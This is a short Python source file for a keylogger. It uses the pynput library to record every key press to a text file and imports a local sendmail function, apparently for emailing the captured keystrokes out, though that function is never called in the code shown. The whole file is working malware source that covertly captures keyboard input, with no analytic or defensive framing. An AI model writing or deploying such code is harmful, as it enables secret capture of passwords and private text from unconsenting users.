from pynput.keyboard import Key, Listener
import logging
from sendmail import sendmail

logging.basicConfig(filename=("error.txt"), level=logging.ERROR, format=" %(asctime)s - %(message)s")

def on_press(key):
    try:
        with open("keylogs.txt", "a", encoding='utf-8') as file:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("enter") > 0:
                file.write("\n")
            elif k.find("Key"):
                file.write(str(k))
                # file.write("şiçşiü")
    except Exception as e:
        logging.error(e)

def keylogger():
    print("keylogger worked")
    with Listener(on_press=on_press) as listener :
        listener.join()

# keylogger()